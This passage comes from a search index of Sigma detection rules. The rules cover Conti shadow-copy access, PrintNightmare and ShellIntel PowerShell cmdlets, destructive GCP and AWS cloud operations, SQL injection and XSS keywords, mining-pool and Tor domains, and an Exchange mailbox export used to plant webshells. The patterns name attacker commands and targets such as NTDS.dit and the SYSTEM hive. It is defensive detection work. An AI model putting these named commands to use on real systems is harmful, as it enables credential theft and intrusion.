\u0026#39;\\\\NTDS.dit\u0026#39; - \u0026#39;\\\\SYSTEM\u0026#39; - \u0026#39;\\\\SECURITY\u0026#39; - \u0026#39;C:\\\\tmp\\\\log\u0026#39; condition: all of selection* falsepositives: - Some rare backup scenarios level: medium tags: - attack.impact - attack.t1490 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_conti_shadowcopy.yml/","tags":["attack.impact","attack.t1490"],"title":"Conti Volume Shadow Listing"},{"categories":null,"contents":"Detects a command used by conti to access volume shadow backups\nKnown false-positives Some rare backup scenarios References https://twitter.com/vxunderground/status/1423336151860002816?s=20 https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection Raw rule (edit) title: Conti Volume Shadow Listing id: c73124a7-3e89-44a3-bdc1-25fe4df754b1 description: Detects a command used by conti to access volume shadow backups author: Max Altgelt, Tobias Michalski date: 2021/08/09 status: experimental references: - https://twitter.com/vxunderground/status/1423336151860002816?s=20 - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;copy \\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy\u0026#39; condition: selection falsepositives: - Some rare backup scenarios level: medium tags: - attack.impact - attack.t1490 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_cmd_shadowcopy_access.yml/","tags":["attack.impact","attack.t1490"],"title":"Conti Volume Shadow Listing"},{"categories":null,"contents":"Detects Commandlet names from ShellIntel exploitation scripts.\nKnown false-positives Unknown References https://github.com/Shellntel/scripts/ Raw rule (edit) title: Malicious ShellIntel PowerShell Commandlets id: 402e1e1d-ad59-47b6-bf80-1ee44985b3a7 status: experimental description: Detects Commandlet names from ShellIntel exploitation scripts. date: 2021/08/09 modified: 2021/10/16 references: - https://github.com/Shellntel/scripts/ tags: - attack.execution - attack.t1059.001 author: Max Altgelt, Tobias Michalski logsource: product: windows category: ps_script definition: Script Block Logging must be enable detection: selection: ScriptBlockText|contains: - Invoke-SMBAutoBrute - Invoke-GPOLinks - Out-Minidump - Invoke-Potato condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_shellintel_malicious_commandlets.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Malicious ShellIntel PowerShell Commandlets"},{"categories":null,"contents":"Detects Commandlet name for PrintNightmare exploitation.\nKnown false-positives Unknown References https://github.com/calebstewart/CVE-2021-1675 Raw rule (edit) title: PrintNightmare Powershell Exploitation id: 6d3f1399-a81c-4409-aff3-1ecfe9330baf status: test description: Detects Commandlet name for PrintNightmare exploitation. date: 2021/08/09 modified: 2021/10/16 references: - https://github.com/calebstewart/CVE-2021-1675 author: Max Altgelt, Tobias Michalski logsource: product: windows category: ps_script definition: Script Block Logging must be enable detection: selection: ScriptBlockText|contains: Invoke-Nightmare condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1548 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_nightmare.yml/","tags":["attack.privilege_escalation","attack.t1548"],"title":"PrintNightmare Powershell Exploitation"},{"categories":null,"contents":"Identifies when a VPN Tunnel Modified or Deleted in Google Cloud.\nKnown false-positives VPN Tunnel being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. VPN Tunnel modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://any-api.com/googleapis_com/compute/docs/vpnTunnels Raw rule (edit) title: Google Cloud VPN Tunnel Modified or Deleted id: 99980a85-3a61-43d3-ac0f-b68d6b4797b1 description: Identifies when a VPN Tunnel Modified or Deleted in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/16 references: - https://any-api.com/googleapis_com/compute/docs/vpnTunnels logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - compute.vpnTunnels.insert - compute.vpnTunnels.delete condition: selection level: medium tags: - attack.impact falsepositives: - VPN Tunnel being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - VPN Tunnel modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_vpn_tunnel_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Google Cloud VPN Tunnel Modified or Deleted"},{"categories":null,"contents":"Identifies when a DNS Zone is modified or deleted in Google Cloud.\nKnown false-positives Unknown References https://cloud.google.com/dns/docs/reference/v1/managedZones Raw rule (edit) title: Google Cloud DNS Zone Modified or Deleted id: 28268a8f-191f-4c17-85b2-f5aa4fa829c3 description: Identifies when a DNS Zone is modified or deleted in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/15 references: - https://cloud.google.com/dns/docs/reference/v1/managedZones logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - Dns.ManagedZones.Delete - Dns.ManagedZones.Update - Dns.ManagedZones.Patch condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_dns_zone_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Google Cloud DNS Zone Modified or Deleted"},{"categories":null,"contents":"Identifies when sensitive information is re-identified in google Cloud.\nKnown false-positives Unknown References https://cloud.google.com/dlp/docs/reference/rest/v2/projects.content/reidentify Raw rule (edit) title: Google Cloud Re-identifies Sensitive Information. id: 234f9f48-904b-4736-a34c-55d23919e4b7 description: Identifies when sensitive information is re-identified in google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/15 references: - https://cloud.google.com/dlp/docs/reference/rest/v2/projects.content/reidentify logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: projects.content.reidentify condition: selection level: medium tags: - attack.impact - attack.t1565 falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_dlp_re_identifies_sensitive_information.yml/","tags":["attack.impact","attack.t1565"],"title":"Google Cloud Re-identifies Sensitive Information."},{"categories":null,"contents":"Detects when a EFS Fileshare is modified or deleted. You can\u0026rsquo;t delete a file system that is in use. If the file system has any mount targets, the adversary must first delete them, so deletion of a mount will occur before deletion of a fileshare.\nKnown false-positives unknown References https://docs.aws.amazon.com/efs/latest/ug/API_DeleteFileSystem.html Raw rule (edit) title: AWS EFS Fileshare Modified or Deleted id: 25cb1ba1-8a19-4a23-a198-d252664c8cef status: experimental description: Detects when a EFS Fileshare is modified or deleted. You can\u0026#39;t delete a file system that is in use. If the file system has any mount targets, the adversary must first delete them, so deletion of a mount will occur before deletion of a fileshare. author: Austin Songer @austinsonger date: 2021/08/15 references: - https://docs.aws.amazon.com/efs/latest/ug/API_DeleteFileSystem.html logsource: product: aws service: cloudtrail detection: selection: eventSource: elasticfilesystem.amazonaws.com eventName: DeleteFileSystem condition: selection falsepositives: - unknown level: medium tags: - attack.impact ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_efs_fileshare_modified_or_deleted.yml/","tags":["attack.impact"],"title":"AWS EFS Fileshare Modified or Deleted"},{"categories":null,"contents":"Detects when a EFS Fileshare Mount is modified or deleted. An adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts.\nKnown false-positives unknown References https://docs.aws.amazon.com/efs/latest/ug/API_DeleteMountTarget.html Raw rule (edit) title: AWS EFS Fileshare Mount Modified or Deleted id: 6a7ba45c-63d8-473e-9736-2eaabff79964 status: experimental description: Detects when a EFS Fileshare Mount is modified or deleted. An adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts. author: Austin Songer @austinsonger date: 2021/08/15 references: - https://docs.aws.amazon.com/efs/latest/ug/API_DeleteMountTarget.html logsource: product: aws service: cloudtrail detection: selection: eventSource: elasticfilesystem.amazonaws.com eventName: DeleteMountTarget condition: selection falsepositives: - unknown level: medium tags: - attack.impact - attack.t1485 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_efs_fileshare_mount_modified_or_deleted.yml/","tags":["attack.impact","attack.t1485"],"title":"AWS EFS Fileshare Mount Modified or Deleted"},{"categories":null,"contents":"Detects sql injection that use GET requests by keyword searches in URL strings\nKnown false-positives Java scripts and CSS Files User searches in search boxes of the respective website Raw rule (edit) title: Detect Sql Injection By Keywords id: 5513deaf-f49a-46c2-a6c8-3f111b5cb453 status: test description: Detects sql injection that use GET requests by keyword searches in URL strings author: Saw Win Naung date: 2020/02/22 modified: 2021/11/27 logsource: category: webserver detection: keywords: - \u0026#39;=select\u0026#39; - \u0026#39;=union\u0026#39; - \u0026#39;=concat\u0026#39; condition: keywords fields: - client_ip - vhost - url - response falsepositives: - Java scripts and CSS Files - User searches in search boxes of the respective website level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/sql_injection_keywords.yml/","tags":null,"title":"Detect Sql Injection By Keywords"},{"categories":null,"contents":"Detects XSS that use GET requests by keyword searches in URL strings\nKnown false-positives Java scripts,CSS Files and PNG files User searches in search boxes of the respective website Raw rule (edit) title: Detect XSS Attempts By Keywords id: 65354b83-a2ea-4ea6-8414-3ab38be0d409 status: experimental description: Detects XSS that use GET requests by keyword searches in URL strings author: Saw Win Naung date: 2021/08/15 logsource: category: webserver detection: keywords: - \u0026#39;=cookie\u0026#39; - \u0026#39;=script\u0026#39; - \u0026#39;=onload\u0026#39; - \u0026#39;=onmouseover\u0026#39; condition: keywords fields: - client_ip - vhost - url - response falsepositives: - Java scripts,CSS Files and PNG files - User searches in search boxes of the respective website level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/xss_keywords.yml/","tags":null,"title":"Detect XSS Attempts By Keywords"},{"categories":null,"contents":"Identifies clients that may be performing DNS lookups associated with common currency mining pools.\nKnown false-positives A DNS lookup does not necessarily mean a successful attempt, verify a) if there was a response using the zeek answers field, if there was then verify the connections (conn.log) to those IPs. b) verify if HTTP, SSL, or TLS activity to the domain that was queried. http.log field is \u0026lsquo;host\u0026rsquo; and ssl/tls is \u0026lsquo;server_name\u0026rsquo;. References https://github.com/Azure/Azure-Sentinel/blob/master/Detections/ASimDNS/imDNS_Miners.yaml Raw rule (edit) title: DNS Events Related To Mining Pools id: bf74135c-18e8-4a72-a926-0e4f47888c19 description: Identifies clients that may be performing DNS lookups associated with common currency mining pools. status: experimental references: - https://github.com/Azure/Azure-Sentinel/blob/master/Detections/ASimDNS/imDNS_Miners.yaml date: 2021/08/19 modified: 2021/08/23 author: Saw Winn Naung, Azure-Sentinel, @neu5ron level: low logsource: service: dns product: zeek tags: - attack.t1569.002 - attack.t1496 detection: selection: query|endswith: - \u0026#39;monerohash.com\u0026#39; - \u0026#39;do-dear.com\u0026#39; - \u0026#39;xmrminerpro.com\u0026#39; - \u0026#39;secumine.net\u0026#39; - \u0026#39;xmrpool.com\u0026#39; - \u0026#39;minexmr.org\u0026#39; - \u0026#39;hashanywhere.com\u0026#39; - \u0026#39;xmrget.com\u0026#39; - \u0026#39;mininglottery.eu\u0026#39; - \u0026#39;minergate.com\u0026#39; - \u0026#39;moriaxmr.com\u0026#39; - \u0026#39;multipooler.com\u0026#39; - \u0026#39;moneropools.com\u0026#39; - \u0026#39;xmrpool.eu\u0026#39; - \u0026#39;coolmining.club\u0026#39; - \u0026#39;supportxmr.com\u0026#39; - \u0026#39;minexmr.com\u0026#39; - \u0026#39;hashvault.pro\u0026#39; - \u0026#39;xmrpool.net\u0026#39; - \u0026#39;crypto-pool.fr\u0026#39; - \u0026#39;xmr.pt\u0026#39; - \u0026#39;miner.rocks\u0026#39; - \u0026#39;walpool.com\u0026#39; - \u0026#39;herominers.com\u0026#39; - \u0026#39;gntl.co.uk\u0026#39; - \u0026#39;semipool.com\u0026#39; - \u0026#39;coinfoundry.org\u0026#39; - \u0026#39;cryptoknight.cc\u0026#39; - \u0026#39;fairhash.org\u0026#39; - \u0026#39;baikalmine.com\u0026#39; - \u0026#39;tubepool.xyz\u0026#39; - \u0026#39;fairpool.xyz\u0026#39; - \u0026#39;asiapool.io\u0026#39; - \u0026#39;coinpoolit.webhop.me\u0026#39; - \u0026#39;nanopool.org\u0026#39; - \u0026#39;moneropool.com\u0026#39; - \u0026#39;miner.center\u0026#39; - \u0026#39;prohash.net\u0026#39; - \u0026#39;poolto.be\u0026#39; - \u0026#39;cryptoescrow.eu\u0026#39; - \u0026#39;monerominers.net\u0026#39; - \u0026#39;cryptonotepool.org\u0026#39; - \u0026#39;extrmepool.org\u0026#39; - \u0026#39;webcoin.me\u0026#39; - \u0026#39;kippo.eu\u0026#39; - \u0026#39;hashinvest.ws\u0026#39; - \u0026#39;monero.farm\u0026#39; - \u0026#39;linux-repository-updates.com\u0026#39; - \u0026#39;1gh.com\u0026#39; - \u0026#39;dwarfpool.com\u0026#39; - \u0026#39;hash-to-coins.com\u0026#39; - \u0026#39;pool-proxy.com\u0026#39; - \u0026#39;hashfor.cash\u0026#39; - \u0026#39;fairpool.cloud\u0026#39; - \u0026#39;litecoinpool.org\u0026#39; - \u0026#39;mineshaft.ml\u0026#39; - \u0026#39;abcxyz.stream\u0026#39; - \u0026#39;moneropool.ru\u0026#39; - \u0026#39;cryptonotepool.org.uk\u0026#39; - \u0026#39;extremepool.org\u0026#39; - \u0026#39;extremehash.com\u0026#39; - \u0026#39;hashinvest.net\u0026#39; - \u0026#39;unipool.pro\u0026#39; - \u0026#39;crypto-pools.org\u0026#39; - \u0026#39;monero.net\u0026#39; - \u0026#39;backup-pool.com\u0026#39; - \u0026#39;mooo.com\u0026#39; # Dynamic DNS, may want to exclude - \u0026#39;freeyy.me\u0026#39; - \u0026#39;cryptonight.net\u0026#39; - \u0026#39;shscrypto.net\u0026#39; exclude_answers: answers: - \u0026#39;127.0.0.1\u0026#39; - \u0026#39;0.0.0.0\u0026#39; exclude_rejected: rejected: \u0026#39;true\u0026#39; condition: selection and not (exclude_answers or exclude_rejected) falsepositives: - A DNS lookup does not necessarily mean a successful attempt, verify a) if there was a response using the zeek answers field, if there was then verify the connections (conn.log) to those IPs. b) verify if HTTP, SSL, or TLS activity to the domain that was queried. http.log field is \u0026#39;host\u0026#39; and ssl/tls is \u0026#39;server_name\u0026#39;. fields: - id.orig_h - id.resp_h - query - answers - qtype_name - rcode_name ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dns_mining_pools.yml/","tags":["attack.t1569.002","attack.t1496"],"title":"DNS Events Related To Mining Pools"},{"categories":null,"contents":"Identifies IPs performing DNS lookups associated with common Tor proxies.\nReferences https://github.com/Azure/Azure-Sentinel/blob/master/Detections/ASimDNS/imDNS_TorProxies.yaml Raw rule (edit) title: DNS TOR Proxies id: a8322756-015c-42e7-afb1-436e85ed3ff5 description: Identifies IPs performing DNS lookups associated with common Tor proxies. status: experimental references: - https://github.com/Azure/Azure-Sentinel/blob/master/Detections/ASimDNS/imDNS_TorProxies.yaml date: 2021/08/15 author: Saw Winn Naung , Azure-Sentinel level: medium logsource: service: dns product: zeek tags: - attack.t1048 detection: selection: query: - \u0026#39;tor2web.org\u0026#39; - \u0026#39;tor2web.com\u0026#39; - \u0026#39;torlink.co\u0026#39; - \u0026#39;onion.to\u0026#39; - \u0026#39;onion.ink\u0026#39; - \u0026#39;onion.cab\u0026#39; - \u0026#39;onion.nu\u0026#39; - \u0026#39;onion.link\u0026#39; - \u0026#39;onion.it\u0026#39; - \u0026#39;onion.city\u0026#39; - \u0026#39;onion.direct\u0026#39; - \u0026#39;onion.top\u0026#39; - \u0026#39;onion.casa\u0026#39; - \u0026#39;onion.plus\u0026#39; - \u0026#39;onion.rip\u0026#39; - \u0026#39;onion.dog\u0026#39; - \u0026#39;tor2web.fi\u0026#39; - \u0026#39;tor2web.blutmagie.de\u0026#39; - \u0026#39;onion.sh\u0026#39; - \u0026#39;onion.lu\u0026#39; - \u0026#39;onion.pet\u0026#39; - \u0026#39;t2w.pw\u0026#39; - \u0026#39;tor2web.ae.org\u0026#39; - \u0026#39;tor2web.io\u0026#39; - \u0026#39;tor2web.xyz\u0026#39; - \u0026#39;onion.lt\u0026#39; - \u0026#39;s1.tor-gateways.de\u0026#39; - \u0026#39;s2.tor-gateways.de\u0026#39; - \u0026#39;s3.tor-gateways.de\u0026#39; - \u0026#39;s4.tor-gateways.de\u0026#39; - \u0026#39;s5.tor-gateways.de\u0026#39; - \u0026#39;hiddenservice.net\u0026#39; condition: selection fields: - clientip ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dns_torproxy.yml/","tags":["attack.t1048"],"title":"DNS TOR Proxies"},{"categories":null,"contents":"Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used.\nKnown false-positives Valid change References https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AzureActivity/Granting_Permissions_To_Account_detection.yaml Raw rule (edit) title: Granting Of Permissions To An Account id: a622fcd2-4b5a-436a-b8a2-a4171161833c status: test description: Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used. author: sawwinnnaung references: - https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AzureActivity/Granting_Permissions_To_Account_detection.yaml date: 2020/05/07 modified: 2021/11/27 logsource: product: azure service: AzureActivity detection: keywords: - Microsoft.Authorization/roleAssignments/write condition: keywords falsepositives: - Valid change level: medium tags: - attack.t1098 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_granting_permission_detection.yml/","tags":["attack.t1098"],"title":"Granting Of Permissions To An Account"},{"categories":null,"contents":"Number of VM creations or deployment activities occur in Azure via the AzureActivity log.\nKnown false-positives Valid change References https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AzureActivity/Creating_Anomalous_Number_Of_Resources_detection.yaml Raw rule (edit) title: Number Of Resource Creation Or Deployment Activities id: d2d901db-7a75-45a1-bc39-0cbf00812192 status: test description: Number of VM creations or deployment activities occur in Azure via the AzureActivity log. author: sawwinnnaung references: - https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AzureActivity/Creating_Anomalous_Number_Of_Resources_detection.yaml date: 2020/05/07 modified: 2021/11/27 logsource: product: azure service: AzureActivity detection: keywords: - Microsoft.Compute/virtualMachines/write - Microsoft.Resources/deployments/write condition: keywords falsepositives: - Valid change level: medium tags: - attack.t1098 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_creating_number_of_resources_detection.yml/","tags":["attack.t1098"],"title":"Number Of Resource Creation Or Deployment Activities"},{"categories":null,"contents":"Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used.\nKnown false-positives Valid change References https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AzureActivity/RareOperations.yaml Raw rule (edit) title: Rare Subscription-level Operations In Azure id: c1182e02-49a3-481c-b3de-0fadc4091488 status: test description: Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used. author: sawwinnnaung references: - https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AzureActivity/RareOperations.yaml date: 2020/05/07 modified: 2021/11/27 logsource: product: azure service: AzureActivity detection: keywords: - Microsoft.DocumentDB/databaseAccounts/listKeys/action - Microsoft.Maps/accounts/listKeys/action - Microsoft.Media/mediaservices/listKeys/action - Microsoft.CognitiveServices/accounts/listKeys/action - Microsoft.Storage/storageAccounts/listKeys/action - Microsoft.Compute/snapshots/write - Microsoft.Network/networkSecurityGroups/write condition: keywords falsepositives: - Valid change level: medium tags: - attack.t1003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_rare_operations.yml/","tags":["attack.t1003"],"title":"Rare Subscription-level Operations In Azure"},{"categories":null,"contents":"Checks for event id 1102 which indicates the security event log was cleared.\nKnown false-positives Legitimate administrative activity References https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/SecurityEventLogCleared.yaml Raw rule (edit) title: Security Event Log Cleared id: a122ac13-daf8-4175-83a2-72c387be339d status: experimental description: Checks for event id 1102 which indicates the security event log was cleared. references: - https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/SecurityEventLogCleared.yaml date: 2021/08/15 modified: 2021/10/13 author: Saw Winn Naung level: medium logsource: service: security product: windows tags: - attack.t1070.001 detection: selection: EventID: 1102 Provider_Name: Microsoft-Windows-Eventlog condition: selection fields: - SubjectLogonId - SubjectUserName - SubjectUserSid - SubjectDomainName falsepositives: - Legitimate administrative activity ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_event_log_cleared.yml/","tags":["attack.t1070.001"],"title":"Security Event Log Cleared"},{"categories":null,"contents":"Identifies when a service account is disabled or deleted in Google Cloud.\nKnown false-positives Service Account being disabled or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Service Account disabled or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts Raw rule (edit) title: Google Cloud Service Account Disabled or Deleted id: 13f81a90-a69c-4fab-8f07-b5bb55416a9f description: Identifies when a service account is disabled or deleted in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/14 references: - https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name|endswith: - .serviceAccounts.disable - .serviceAccounts.delete condition: selection level: medium tags: - attack.impact - attack.t1531 falsepositives: - Service Account being disabled or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service Account disabled or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_service_account_disabled_or_deleted.yml/","tags":["attack.impact","attack.t1531"],"title":"Google Cloud Service Account Disabled or Deleted"},{"categories":null,"contents":"Identifies when a service account is modified in Google Cloud.\nKnown false-positives Service Account being modified may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Service Account modified from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts Raw rule (edit) title: Google Cloud Service Account Modified id: 6b67c12e-5e40-47c6-b3b0-1e6b571184cc description: Identifies when a service account is modified in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/14 references: - https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name|endswith: - .serviceAccounts.patch - .serviceAccounts.create - .serviceAccounts.update - .serviceAccounts.enable - .serviceAccounts.undelete condition: selection level: medium tags: - attack.impact falsepositives: - Service Account being modified may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service Account modified from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_service_account_modified.yml/","tags":["attack.impact"],"title":"Google Cloud Service Account Modified"},{"categories":null,"contents":"Detects when storage bucket is enumerated in Google Cloud.\nKnown false-positives Storage Buckets being enumerated may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Storage Buckets enumerated from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/storage/docs/json_api/v1/buckets Raw rule (edit) title: Google Cloud Storage Buckets Enumeration id: e2feb918-4e77-4608-9697-990a1aaf74c3 description: Detects when storage bucket is enumerated in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/14 references: - https://cloud.google.com/storage/docs/json_api/v1/buckets logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - storage.buckets.list - storage.buckets.listChannels condition: selection level: low tags: - attack.discovery falsepositives: - Storage Buckets being enumerated may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Storage Buckets enumerated from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_bucket_enumeration.yml/","tags":["attack.discovery"],"title":"Google Cloud Storage Buckets Enumeration"},{"categories":null,"contents":"Detects when storage bucket is modified or deleted in Google Cloud.\nKnown false-positives Storage Buckets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Storage Buckets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/storage/docs/json_api/v1/buckets Raw rule (edit) title: Google Cloud Storage Buckets Modified or Deleted id: 4d9f2ee2-c903-48ab-b9c1-8c0f474913d0 description: Detects when storage bucket is modified or deleted in Google Cloud. author: Austin Songer @austinsonger status: experimental date: 2021/08/14 references: - https://cloud.google.com/storage/docs/json_api/v1/buckets logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - storage.buckets.delete - storage.buckets.insert - storage.buckets.update - storage.buckets.patch condition: selection level: medium tags: - attack.impact falsepositives: - Storage Buckets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Storage Buckets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_bucket_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Google Cloud Storage Buckets Modified or Deleted"},{"categories":null,"contents":"Identifies potential full network packet capture in gcp. This feature can potentially be abused to read sensitive data from unencrypted internal traffic.\nKnown false-positives Full Network Packet Capture may be done by a system or network administrator. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/com/google/api/services/compute/Compute.PacketMirrorings.html Raw rule (edit) title: Google Full Network Traffic Packet Capture id: 980a7598-1e7f-4962-9372-2d754c930d0e description: Identifies potential full network packet capture in gcp. This feature can potentially be abused to read sensitive data from unencrypted internal traffic. author: Austin Songer @austinsonger status: experimental date: 2021/08/13 references: - https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging - https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/com/google/api/services/compute/Compute.PacketMirrorings.html logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - v*.Compute.PacketMirrorings.Get - v*.Compute.PacketMirrorings.Delete - v*.Compute.PacketMirrorings.Insert - v*.Compute.PacketMirrorings.Patch - v*.Compute.PacketMirrorings.List - v*.Compute.PacketMirrorings.aggregatedList condition: selection level: medium tags: - attack.collection - attack.t1074 falsepositives: - Full Network Packet Capture may be done by a system or network administrator. - If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_full_network_traffic_packet_capture.yml/","tags":["attack.collection","attack.t1074"],"title":"Google Full Network Traffic Packet Capture"},{"categories":null,"contents":"Detects when a firewall rule is modified or deleted in Google Cloud Platform (GCP).\nKnown false-positives Firewall rules being modified or deleted may be performed by a system administrator. Verify that the firewall configuration change was expected. Exceptions can be added to this rule to filter expected behavior. References https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/com/google/api/services/compute/Compute.Firewalls.html Raw rule (edit) title: Google Cloud Firewall Modified or Deleted id: fe513c69-734c-4d4a-8548-ac5f609be82b description: Detects when a firewall rule is modified or deleted in Google Cloud Platform (GCP). author: Austin Songer @austinsonger status: experimental date: 2021/08/13 references: - https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging - https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/com/google/api/services/compute/Compute.Firewalls.html logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - v*.Compute.Firewalls.Delete - v*.Compute.Firewalls.Patch - v*.Compute.Firewalls.Update - v*.Compute.Firewalls.Insert condition: selection level: medium tags: - attack.defense_evasion - attack.t1562 falsepositives: - Firewall rules being modified or deleted may be performed by a system administrator. Verify that the firewall configuration change was expected. - Exceptions can be added to this rule to filter expected behavior. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_firewall_rule_modified_or_deleted.yml/","tags":["attack.defense_evasion","attack.t1562"],"title":"Google Cloud Firewall Modified or Deleted"},{"categories":null,"contents":"Detects a successful export of an Exchange mailbox to untypical directory or with aspx name suffix which can be used to place a webshell or the needed role assignment for it\nKnown false-positives unlikely References https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html Raw rule (edit) title: Mailbox Export to Exchange Webserver id: 516376b4-05cd-4122-bae0-ad7641c38d48 status: experimental description: Detects a successful export of an Exchange mailbox to untypical directory or with aspx name suffix which can be used to place a webshell or the needed role assignment for it references: - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html author: Florian Roth, Rich Warren, Christian Burkard date: 2021/08/09 modified: 2022/02/01 logsource: service: msexchange-management product: windows detection: export_command: - \u0026#39;New-MailboxExportRequest\u0026#39; - \u0026#39; -Mailbox \u0026#39; export_params: - \u0026#39;-FilePath \u0026#34;\\\\\\\\localhost\\\\C$\u0026#39; - \u0026#39;-FilePath \u0026#34;\\\\\\\\127.0.0.1\\\\C$\u0026#39; - 